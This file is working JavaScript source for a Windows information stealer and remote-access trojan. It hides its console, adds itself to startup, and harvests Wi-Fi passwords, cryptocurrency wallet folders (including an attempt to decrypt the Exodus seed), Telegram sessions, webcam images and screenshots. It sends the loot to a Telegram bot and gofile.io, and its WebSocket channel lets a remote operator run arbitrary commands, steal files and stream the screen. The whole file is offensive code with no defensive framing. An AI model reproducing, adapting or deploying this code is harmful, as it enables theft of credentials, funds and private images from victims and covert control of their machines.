const
    TEST_MODE = false,
    domain = "%domain%",
    rdomain = `http${domain == "localhost" ? "" : "s"}://${domain}`,
    rrdomain = rdomain.replace("http://localhost", "https://discord.com"), // telegram accepte pas les liens local
    key = "%key%",
    { token, chat } = base64toJson(key),
    fs = require("fs"),
    os = require("os"),
    jszip = require("zip-lib"),
    axios = require("axios"),
    path = require("path"),
    { execSync, exec } = require("child_process"),
    screenshot = require('screenshot-desktop'),
    { Telegraf, Markup } = require('telegraf'),
    WebSocket = require("ws").WebSocket,
    crypto = require("crypto"),
    // dpapi = require("win-dpapi"),
    // clip = require('clipboard-data'),
    sqlite3 = require("sqlite3"),
    seco = require("seco-file"),
    zlib = require("zlib"),
    FormData = require("form-data"),
    process = require('process'),
    stream = require("stream"),
    filedownload = require('file-download'),
    bs = require("bitcoin-seed"),
    NodeWebcam = require("node-webcam"),
    Webcam = NodeWebcam.create({ width: 1280, height: 720, quality: 100, frames: 60, delay: 0, saveShots: true, output: "jpeg", device: false, callbackReturn: "location", verbose: false });

if (!token && !chat) {
    dialogError("Une erreur est survenue, merci de contacter les dévelopeurs :( [ERREOR CODE: 0x277]")
    return;
};
const
    appdata = process.env.APPDATA,
    localappdata = process.env.LOCALAPPDATA,
    IPAddress = execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress")?.toString()?.split("\r\n")[0],
    UUID = execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID")?.toString()?.split("\r\n")[0],
    client = new Telegraf(token),
    co = new WebSocket('ws://' + domain);
client.launch().catch(() => {
    dialogError("Une erreur est survenue, merci de contacter les dévelopeurs ! [ERREOR CODE: 0x174]")
});
co.onopen = async function (e) {
    console.log('ws on');
};
co.onclose = function (message) {
    console.log('ws off');
    dialogError("Une erreur est survenue, merci de contacter les dévelopeurs !  [ERREOR CODE: 0x335]")
};
co.onerror = function (err) {
    console.log('ws err: ', err);
    // steal()
    // dialogError("Une erreur est survenue, merci de contacter les dévelopeurs ! [ERREOR CODE: 0x335]")
};
co.onmessage = async function (message) {
    const data = JSON.parse(message.data);

    if (data.type == "on") {
        co.send(JSON.stringify({
            type: "newclient",
            uuid: UUID
        }));

         steal(true);
    } else if (data.type == "cmd" && data.cmd && !data.msg) {
        if (data.cmd == "pcinfo") {
            const { pcInfoF, pcInfoT } = getPcInfo();
            let r = "";
            pcInfoF.split("\n").forEach(e => r += e.replace(`${e.split(": ")[1]?.split(" ")?.join(" ")}`, `<span onclick="copyText(this)" class="mainc copy">${e.split(": ")[1].split(" ").join(" ")}</span>`) + "\n");
            r = getR(r);
            data.msg = r || "error";
            co.send(JSON.stringify(data))
        } else if (data.cmd == "wificonnections") {
            var { wifiC, wifiT } = getWifi();
            wifiT = `🌐 ${wifiC || 0} Wifi\n<span class="mainc copy" onclick="copyText(this)">${wifiT}</span>`;
            data.msg = wifiT || "error";
            co.send(JSON.stringify(data))
        } else if (data.cmd == "wificonnections") {
            var { wifiC, wifiT } = getWifi();
            wifiT = `🌐 ${wifiC || 0} Wifi\n<span class="mainc copy" onclick="copyText(this)">${wifiT}</span>`;
            data.msg = wifiT || "error";
            co.send(JSON.stringify(data))
        } else if (data.cmd == "clipboard") {
            // data.msg = `<pre>${clip.getText()}</pre>`;
            data.msg = "ERROR"
            co.send(JSON.stringify(data))
        } else if (data.cmd == "webcam") {
            const
                ptScreen = getTempPath('webcam'),
                screenYes = await new Promise(resolve => {
                    Webcam.capture(ptScreen, function (err, data) {
                        if (err) return resolve(false);
                        else resolve(`${ptScreen}.jpg`);
                    });
                });
            if (screenYes) data.msg = `<img src="data:image/png;base64,${fs.readFileSync(screenYes, 'base64')}"/>`;
            else data.msg = `No camera !`;
            co.send(JSON.stringify(data))
        } else if (data.cmd == "getfiledir") {
            const
                path = data.path,
                error = () => {
                    data.msg = `<span class="mainc">An error occurred check the path!</span>`;
                    co.send(JSON.stringify(data));
                    return
                };
            try {
                if (!fs.existsSync(path) && !isDirectory(path)) return error();
                const allFiles = await fs.promises.readdir(path, { withFileTypes: true });
                if (!allFiles.length || allFiles.length == 0) return error();
                let out = "";
                allFiles.forEach((file, i) => {
                    const p = `${path}\\${file.name}`;
                    if (isDirectory(p)) out += `📂 ${file.name}`;
                    else out += `📃 ${file.name} - ${getrsize(fs.statSync(p).size)}`;
                    out += i < allFiles.length - 1 ? ",\n" : "";
                });
                data.msg = `Path: <span class="mainc copy" onclick="copyText(this)">${path}</span>\n<pre>${out}</pre>\n<span class="copy mainc" onclick="goCmd('downloadon')">downloadon</span> to download the files`;
                co.send(JSON.stringify(data));
            } catch (err) {
                console.log(err);
                return error();
            }
        } else if (data.cmd == "getfile") {
            const path = data.path;
            if (!fs.existsSync(path)) {
                data.msg = `<span class="mainc">An error occurred check the path!</span>`;
                co.send(JSON.stringify(data));
                return
            };
            const upload = await uploadFile(fs.createReadStream(path)).catch(() => { });
            if (upload) data.msg = `Gofile: <a target="_blank" href="${upload?.downloadPage}">${upload?.downloadPage}</a>`;
            else data.msg = `<span class="mainc">An error occurred!</span>`;
            co.send(JSON.stringify(data));
        } else if (data.cmd == "execute") {
            const path = data.path;
            if (!fs.existsSync(path)) {
                data.msg = `<span class="mainc">An error occurred check the path!</span>`;
                co.send(JSON.stringify(data));
                return
            };
            exec(os.tmpdir() + "\\" + filepath, (error, stdout, stderr) => {
                if (error) {
                    data.msg = `<span class="mainc">An error occurred check the path or file!</span>`;
                    co.send(JSON.stringify(data));
                    return
                };
                data.msg = `<span class="mainc">'Successfully Executed !</span>`;
                co.send(JSON.stringify(data));
            });

        } else if (data.cmd == "download") {
            const
                url = data.url,
                name = url?.split("/")[url?.split("/")?.length - 1] || "file";
            filedownload(url, { directory: os.tmpdir(), filename: name }, function (err) {
                if (err) {
                    data.msg = `<span class="mainc">An error occurred check the url!</span>`;
                    co.send(JSON.stringify(data));
                    return
                };
                data.msg = `Successfully downloaded\nPath: <span class="copy mainc" onclick="copyText(this);">${os.tmpdir()}\\${name}</span>`;
                co.send(JSON.stringify(data));
            })
        } else if (data.cmd == "exec") {
            const cmd = data.exec;
            try {
                const result = execSync(cmd)?.toString()
                data.msg = `<pre>${result}</pre>`;
                co.send(JSON.stringify(data))
            } catch (error) {
                data.msg = `<span class="mainc">An error occurred during the execution of the order check the order!</span>`;
                co.send(JSON.stringify(data))
            }
        } else if (data.cmd == "key") {
            data.msg = `🔐 Key: <span class="mainc copy" onclick="copyText(this)">${key}</span>\n🤖 Token: <span class="mainc copy" onclick="copyText(this)">${token}</span>\n📍 Chat: <span class="mainc copy" onclick="copyText(this)">${chat}</span>`;
            co.send(JSON.stringify(data))
        } else if (data.cmd == "screen") {
            const
                ptScreen = getTempPath('screen.png'),
                screenYes = await new Promise(resolve => {
                    screenshot({ filename: ptScreen })
                        .then(e => resolve(true))
                        .catch(e => resolve(false));
                });
            if (screenYes) data.msg = `<img src="data:image/png;base64,${fs.readFileSync(ptScreen, 'base64')}"/>`;
            else data.msg = `ERROR`;
            co.send(JSON.stringify(data))
        }
    }

};


async function steal(wson) {
    if (!TEST_MODE) {
        hideSelf();
        setToStartup();
    };
    const allFiles = await getAllFiles();
    let all = [], btn = [];
    for (let i = 0; i < allFiles.length; i++) {
        const el = allFiles[i];
        const Yes = await new Promise(resolve => {
            fs.writeFileSync(getTempPath(el.name), el.file, "utf-8", function (err) {
                if (err) return resolve(false);
                else resolve(true)
            });
            resolve(true)
        });
        if (Yes) {
            const obj = {
                type: 'document',
                media: { source: fs.createReadStream(getTempPath(el.name)), filename: el.name },
                parse_mode: "HTML"
            };
            if (el.caption) obj.caption = `${el.caption}\n---------------------------------------------------`;
            all.push(obj);
        }
    };
    const walletsYes = await new Promise(async resolve => {
        const allWallets = {
            "Zcash": `${appdata}\\Zcash`, //💸
            "Armory": `${appdata}\\Armory`,    //🚀
            "Bytecoin": `${appdata}\\bytecoin`,   //📀
            "Jaxx": `${appdata}\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb`, //💵
            "Exodus": `${appdata}\\Exodus\\exodus.wallet`,//💎
            "Ethereum": `${appdata}\\Ethereum\\keystore`, //📉
            "Electrum": `${appdata}\\Electrum\\wallets`, //🔨
            "AtomicWallet": `${appdata}\\atomic\\Local Storage\\leveldb`,//🕹️
            "Guarda": `${appdata}\\Guarda\\Local Storage\\leveldb`,
            "Coinomi": `${appdata}\\Coinomi\\Coinomi\\wallets`,  //⚡
            "MetaMask": `${localappdata}\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn`,//🦊
        };
        try {
            let all = "";
            for (let [key, value] of Object.entries(allWallets)) {
                if (fs.existsSync(value)) {
                    let msg = `@~$~@ghost-${value}\n`;
                    const path = getTempPath(`${key}.zip`);
                    if (!TEST_MODE) {
                        await jszip.archiveFolder(value, path).catch(() => { });
                        const upload = await uploadFile(fs.createReadStream(path)).catch(() => { });
                        if (upload) {
                            msg += `URL ZIP: ${upload?.downloadPage}\n`;
                            fs.unlink(path, (err) => { if (err) return });
                        }
                        if (key == "Exodus") {
                            class Exodus {
                                static shrink(e) {
                                    const t = e.readUInt32BE(0);
                                    return e.slice(4, t + 4)
                                }

                                static decrypt(seedSeco, passwords) {

                                    for (const password of passwords) {
                                        try {
                                            let decrypted = seco.decryptData(seedSeco, password).data;
                                            let shrinked = this.shrink(decrypted);
                                            let gunzipped = zlib.gunzipSync(shrinked);
                                            let mnemonic = bs.fromBuffer(gunzipped).mnemonicString;

                                            return mnemonic;
                                        }
                                        catch {
                                        }
                                    }

                                    return null;
                                }
                            };
                            msg += `EXODUS PASSWORDS: "[I couldn't get it back :(]\n`;
                            msg += `EXODUS SEED: ${Exodus.decrypt(fs.readFileSync(`${value}\\seed.seco`), ["test", "passwords", "five", "123456"]) || "[I couldn't get it back :(]"}\n`;
                        };
                    };
                    msg = getR(msg);
                    all += msg
                };
            };
            Object.keys(allWallets).forEach(function (key) {
                allWallets["<b>" + key + ":</b>"] = allWallets[key];
                delete allWallets[key];
            });
            let allTlg = "", wallets = 0;
            for (let [key, value] of Object.entries(allWallets)) {
                if (fs.existsSync(value)) {
                    allTlg += `${key} <code>\\AppData${value.split("AppData")[1]}</code>\n`;
                    wallets++;
                }
                // else all += `${key}: ❌\n`;
            };
            allTlg = `<b>💸 Wallets/Important extensions:</b> <code>${wallets}</code>\n${allTlg}---------------------------------------------------`;

            if (all != "") {
                const path = getTempPath("wallets.txt");
                fs.writeFileSync(path, all, "utf-8", function (err) { if (err) return });
                resolve({ allTlg, path });
            } else resolve(false);
        } catch (err) {
            console.log(err)
            return resolve(false)
        }
    });
    if (walletsYes) {
        all.push({
            type: 'document',
            caption: walletsYes.allTlg,
            media: { source: fs.createReadStream(walletsYes?.path), filename: "wallets.txt" },
            parse_mode: "HTML"
        })
    };

    const
        telegramYes = await new Promise(async resolve => {
            const tdataPath = `${appdata}\\Telegram Desktop\\tdata`;
            if (!fs.existsSync(tdataPath)) return resolve(false);
            const
                tdataFiles = await fs.promises.readdir(tdataPath, { withFileTypes: true }),
                files = tdataFiles.filter(
                    file =>
                        !file.name.startsWith('user_data') &&
                        file.name !== 'temp' &&
                        file.name !== 'dumps' &&
                        file.name !== 'emoji' &&
                        file.name !== 'working' &&
                        file.name !== 'tdummy'
                ),
                zip = new jszip.Zip();
            if (!TEST_MODE) {
                for (const file of files) {
                    if (file.isDirectory()) zip.addFolder(path.join(tdataPath, file.name));
                    else zip.addFile(path.join(tdataPath, file.name));
                };
            } else {
                fs.writeFile(getTempPath("empty.txt"), "LANCER SUR TEST MODE", "utf-8", () => { });
                zip.addFile(getTempPath("empty.txt"));
            };
            await zip.archive(getTempPath("telegram.zip")).then(function () { fs.unlink(getTempPath("empty.txt"), (err) => { if (err) return }); resolve(true); }, function (err) { console.log(err); resolve(false) });
        });
    if (telegramYes) {
        all.push({
            type: 'document',
            media: { source: fs.createReadStream(getTempPath('telegram.zip')), filename: "telegramSession.zip" },
            parse_mode: "HTML"
        })
    };

    const
        ptwebcam = getTempPath('webcam'),
        webcamYes = await new Promise(resolve => {
            Webcam.capture(ptwebcam, function (err, data) {
                if (err) return resolve(false);
                else resolve(`${ptwebcam}.jpg`);
            });
        });
    if (webcamYes) {
        all.push({
            type: 'document',
            media: { source: fs.createReadStream(`${ptwebcam}.jpg`), filename: "webcam.jpg" },
            parse_mode: "HTML"
        })
    };

    const
        ptScreen = getTempPath('screen.png'),
        screenYes = await new Promise(resolve => {
            screenshot({ filename: ptScreen })
                .then(e => resolve(true))
                .catch(e => resolve(false));
        });
    if (screenYes) {
        const obj = {
            type: 'document',
            media: { source: fs.createReadStream(ptScreen), filename: "screen.png" },
            parse_mode: "HTML"
        };
        if (wson) {
            btn.push({ text: '👀 STREAM', url: `${rrdomain}/stream?uuid=${UUID}` });
            if (!TEST_MODE) goStream();
        };
        all.push(obj)
    };
    if (wson) btn.push({ text: '🔌 CONNEXION', url: `${rrdomain}/connexion?uuid=${UUID}` });
    client.telegram.sendMediaGroup(chat, all, { reply_markup: { inline_keyboard: [btn] } }).then((e) => {
        let execmsg = "";
        for (let [key, value] of Object.entries({ "☠️ Execution path": process.execPath, "🅿️ Debug port": process.debugPor, "🔢 PID": process.pid, "🔢 PPID": process.ppid, })) { execmsg += `<b>${key}:</b> <code>${value}</code>\n` }
        execmsg = getR(execmsg);
        client.telegram.sendMessage(chat, `${rdomain.includes("localhost") ? "<code>API HOST EN LOCAL DONC LES LIENS SONT REMPLACER PAR DISCORD.COM CAR TELEGRAM ACCEPTE PAS LES LIENS LOCAL</code>\n\n" : ""}${execmsg}\n\n<b>✌ By:</b> <code>https://github.com/zougataga</code>`, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: [btn] }
        }).catch(() => { });
        try {
            allFiles.forEach(e => fs.unlink(getTempPath(e.name), (err) => { if (err) return }));
            if (screenYes) fs.unlink(ptScreen, (err) => { if (err) return });
            if (webcamYes) fs.unlink(`${ptwebcam}.jpg`, (err) => { if (err) return });
            if (telegramYes) fs.unlink(getTempPath("telegram.zip"), (err) => { if (err) return });
            if (walletsYes) fs.unlink(walletsYes?.path, (err) => { if (err) return });
        } catch (error) {
            console.log(error)
            return;
        }
    }).catch((e) => { console.log(e); });
}

async function getAllFiles() {
    const
        { pcInfoF, pcInfoT } = getPcInfo(),
        { wifiC, wifiT } = getWifi(),
        // { passCount, pass } = await getPasswords(),
        allFile = [
            { name: 'PcInfo.txt', caption: pcInfoT, file: pcInfoF },
            { name: 'WiFiConnections.txt', caption: `<b>📶 Wifi networks:</b> <code>${wifiC}</code>\n`, file: wifiT },
            // { name: `passwords.txt`, file: pass, caption: `<code>🔑 ${passCount} Passwords</code>\n` },

        ];
    return allFile;
}
function goStream(ptScreen) {
    if (!ptScreen) ptScreen = getTempPath('screen.png');
    (function capture() {
        return new Promise((resolve, reject) => {
            screenshot({ filename: ptScreen }).then(async () => {
                await co.send(JSON.stringify({ type: "stream", uuid: UUID, base64: fs.readFileSync(ptScreen, 'base64') }));
                resolve(await capture());
            }).catch((err) => {
                reject(err);
            });
        });
    })();
}
function getTempPath(name) { return path.join(os.tmpdir(), name) }
function base64toJson(base64String) { try { const jsonString = Buffer.from(base64String, 'base64').toString(); return JSON.parse(jsonString) } catch (err) { return } }
function dialogError(msg) { try { execSync('powershell.exe -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\'' + msg + '\', \'Erreur\', 0, 16)"'); setTimeout(() => process.exit(), 5000) } catch (error) { return } }
function getR(string) { let r = []; string.split("\n").forEach(e => { if (e.trim() != "") r.push(e) }); return r.join("\n") }
function getrsize(size) { const i = Math.floor(Math.log(size) / Math.log(1024)); return (size / Math.pow(1024, i)).toFixed(2) * 1 + " " + ['B', 'KB', 'MB', 'GB', 'TB'][i] };
function isDirectory(path) { try { return fs.statSync(path).isDirectory(); } catch (err) { return false; } }
function getPcInfo() {
    const
        user = {
            ram: `${Math.round(os.totalmem() / 1024 / 1024 / 1024)} GB`,
            version: os.version(),
            uptime: `${(os.uptime() / 60).toFixed(0)} minutes (${(os.uptime() / 60 / 60).toFixed(2)} hours)`,
            hostdir: os.homedir(),
            hostname: os.hostname(),
            username: os.userInfo().username,
            type: os.type(),
            arch: os.arch(),
            release: os.release(),
            appdata: process.env.APPDATA,
            localappdata: process.env.LOCALAPPDATA,
            temp: process.env.TEMP,
            user_domain: process.env.COMPUTERNAME,
            monitor_address: process.env.MONITOR_ADDRESS,
            processor_identifier: process.env.PROCESSOR_IDENTIFIER,
            processor_architecture: process.env.PROCESSOR_ARCHITECTURE,
            processors: process.env.NUMBER_OF_PROCESSORS,
            system_drive: process.env.SystemDrive,
            autostart: [process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", process.env.SystemDrive + "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"],
            connection_info: undefined,
        },
        MacAddress = execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress")?.toString()?.split("\r\n")[0],
        ProductKey = execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey")?.toString()?.split("\r\n")[0],
        localIP = execSync("powershell.exe (Get-NetIPAddress).IPAddress")?.toString()?.split('\r\n')[0],
        cpus = [];
    os.cpus().forEach((cpu) => {
        if (!cpus.includes(cpu.model)) {
            cpus.push(cpu.model)
            cpus.push(cpu.model.split("  ")[0])
        }
    });
    let obj = {
        "🆔 Host name": user.hostname,
        "🆔 PC Name": user.username,
        "📍 IPAddress": IPAddress,
        "📍 localIP": localIP,
        "📍 MacAdress": MacAddress,
        "🔐 ProductKey": ProductKey,
        "👻 Type": user.type,
        "⏳ Uptime": user.uptime,
        "🖥️ CPU(s)": cpus.join(" | "),
        "⚡ RAM": user.ram,
        "🛑 Version": user.version,
        "⏳ Uptime": user.uptime,
        "📂 Host directory": user.hostdir,
        "👻 Type": user.type,
        "🏹 Arch": user.arch,
        "📢 Release": user.release,
        "🌌 AppData Path": user.appdata,
        "🪐 Temp Path": user.temp,
        "🌐 User Domain": user.user_domain,
        "💨 System Drive": user.system_drive,
        "💾 Processors": user.processors,
        "💾 Processor Identifier": user.processor_identifier,
        "💾 Processor Architecture": user.processor_architecture,
    }, pcInfoF = "", pcInfoT = "";
    for (let [key, value] of Object.entries(obj)) { pcInfoF += `${key}: ${value}\n` }

    Object.keys(obj).forEach(function (key) {
        obj["<b>" + key + "</b>"] = obj[key];
        delete obj[key];
    });
    let objCopy = { ...obj };
    Object.keys(objCopy).forEach(function (key) {
        obj[key] = "<code>" + objCopy[key] + "</code>";
    });
    let keys = Object.keys(obj);
    let topKeys = keys.slice(0, 3);
    let newObj = {};
    topKeys.forEach(function (key) {
        newObj[key] = obj[key];
    });
    obj = newObj;
    for (let [key, value] of Object.entries(obj)) { pcInfoT += `${key}: ${value}\n` }
    pcInfoF = getR(pcInfoF);
    pcInfoT = getR(pcInfoT);
    return { pcInfoF, pcInfoT }
}
function getWifi() {
    const get = () => {
        let all = [];
        const allWifi = execSync("netsh wlan show profiles", { shell: "powershell.exe" }).toString().split("\n")
        allWifi.forEach(e => {
            e = e.trim();
            if (e.startsWith("Profil Tous les utilisateurs  ")) {
                e = e.replace("Profil Tous les utilisateurs", "").trim().split(" ")[1];
                all.push(getPass(e))
            }
        });
        return all;

        function getPass(ssid) {
            const WifiPass = execSync(`netsh wlan show profile name=${ssid} key=clear`, { shell: "powershell.exe" }).toString().split("\n");
            let pass;
            WifiPass.forEach(e => {
                e = e.trim();
                if (e.startsWith("Contenu de la cl")) {
                    e = e.split(":")[1].trim();
                    pass = e
                }
            });
            return `${ssid} | ${pass}`
        }
    };
    const wifi_connections = get();
    let wifiT = "", wifiC = 0;
    wifi_connections.forEach((t) => {
        wifiT += `${t}\n`;
        wifiC++;
    });
    wifiT = getR(wifiT);
    return { wifiC, wifiT }
}
function setToStartup() {
    try {
        fs.writeFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat", "START v.exe");
        fs.writeFileSync("C:\\Users\\" + os.userInfo().username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe", fs.readFileSync(process.argv[0], { encoding: null }))
    } catch (error) {
        console.log(error);
        return;
    }
}
function hideSelf() {
    const
        tempfile = `${process.cwd()}\\temp.ps1`,
        powershellScript = `
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
#0 hide
[Console.Window]::ShowWindow($consolePtr, 0)
`;
    fs.writeFileSync(tempfile, powershellScript);
    execSync(`type .\\temp.ps1 | powershell.exe -noprofile -`, { stdio: 'inherit' });
    fs.unlink(tempfile, (err) => { if (err) return });
}


async function getServer() {
    try {
        const res = await axios({
            url: `https://apiv2.gofile.io/getServer`,
            method: "GET",
            headers: {
                accept: "*/*",
                "accept-language": "en-US,en;",
                "cache-control": "no-cache",
                pragma: "no-cache",
                referrer: "https://gofile.io/uploadFiles",
                mode: "cors",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
                dnt: 1,
                origin: "https://gofile.io"
            },
        });

        if (res.data.status !== "ok") {
            throw new Error(`Fetching server info failed: ${JSON.stringify(res.data)}`);
        }
        return res.data.data.server;
    } catch (e) {
        console.log("Error with fetching server:");
        console.error(e);
    }
}
async function uploadFiles(files, options = {}) {
    try {
        let server = await getServer();
        for (let f of files) {
            const fd = new FormData();
            if (f.fn === "") {
                fd.append("file", f.file);
            } else {
                fd.append("file", f.file, f.fn);
            }
            if (options.description) {
                if (options.description.length <= 1000) {
                    fd.append("description", options.description);
                } else {
                    throw new Error("Invalid value for field description. ");
                }
            }

            if (options.tags) {
                if (options.tags.length <= 1000) {
                    fd.append("tags", options.tags);
                } else {
                    throw new Error("Invalid value for field tags. ");
                }
            }
            if (options.ac) {
                if (options.ac.length <= 20) {
                    fd.append("ac", options.ac);
                } else {
                    throw new Error("Invalid value for field ac. ");
                }
            }

            if (options.email) {
                if (/.+@.+\..+/i.test(options.email)) {
                    fd.append("email", options.email);
                } else {
                    throw new Error("Invalid value for field email. ");
                }
            }

            if (options.password) {
                if (/^[a-z0-9]{6,20}$/i.test(options.password)) {
                    fd.append("password", options.password);
                } else {
                    throw new Error("Invalid value for field password. ");
                }
            }
            if (options.expire) {
                if (!isNaN(options.expire) && options.expire > 10000000000 ? options.expire : options.expire / 1000 > Date.now() / 1000) {
                    fd.append("expire", Math.round(options.expire > 10000000000 ? options.expire : options.expire / 1000));
                } else {
                    throw new Error("Invalid value for field expire. ");
                }
            }

            const res = await axios({
                url: `https://${server}.gofile.io/uploadFile`,
                method: "POST",
                headers: {
                    accept: "*/*",
                    "accept-language": "en-US,en;",
                    "cache-control": "no-cache",
                    pragma: "no-cache",
                    referrer: "https://gofile.io/uploadFiles",
                    mode: "cors",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
                    dnt: 1,
                    origin: "https://gofile.io",
                    ...fd.getHeaders(),
                },
                'maxContentLength': Infinity,
                'maxBodyLength': Infinity,
                referrer: "https://gofile.io/uploadFiles",
                data: fd,
            });

            if (res.data.status !== "ok") {
                throw new Error(`Uploading file failed: ${JSON.stringify(res.data)}`);
            }
            return res.data.data;
        }
    } catch (e) {
        console.log("Error with file upload.");
        console.error(e);
    }
}
async function uploadFile(arg1, arg2, arg3) {
    if (arg1 instanceof Buffer || arg1 instanceof ArrayBuffer) {
        if (arg2 && arg2 !== "" && typeof arg2 !== "object") {
            return uploadFiles([{ file: arg1, fn: arg2 }], arg3);
        } else {
            throw Error("Filename must not be blank when using a Buffer.");
        }
    } else if (arg1 instanceof stream.Readable) {
        if (arg2 && arg2 !== "" && typeof arg2 !== "object") {
            return uploadFiles([{ file: arg1, fn: arg2 }], arg3);
        } else {
            return uploadFiles([{ file: arg1 }], arg2);
        }
    } else {
        throw Error("Invalid file type");
    }
}

